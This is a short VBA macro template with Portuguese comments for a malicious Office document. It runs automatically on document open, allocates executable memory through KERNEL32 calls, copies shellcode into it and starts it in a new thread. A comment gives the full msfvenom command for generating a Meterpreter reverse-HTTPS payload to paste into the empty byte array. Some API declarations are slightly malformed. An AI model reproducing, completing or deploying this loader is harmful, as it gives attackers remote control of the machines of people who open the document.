' Chegar se as importações 

Private Declare PtrSafe Function VirtualAlloc LIb "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr 
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByVal sSource As Any, ByVal lLenght as Long) As LongPtr 
Private Declare PtrSafe function CreateThread "KERNEL32" (ByVal SecurityAttributes as Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameters As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Sub Document_Open 
    myMacro 

End Sub 

Sub AutoOpen  
    myMacro 
End Sub 


Sub myMacro 
    Dim buf As Variant 
    Dim addr as LongPtr 

    Dim counter as Long 

    buf = Array() ' <- Aqui vai o seu array de bytes no qual é seu Shellcode  (msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.1 LPORT=444 EXITFUNC=thread -f vbapplication)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    for counter = LBound(buf) to Ubound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    res = CreateThread(0, 0, addr, 0, 0, 0) 

End Sub 
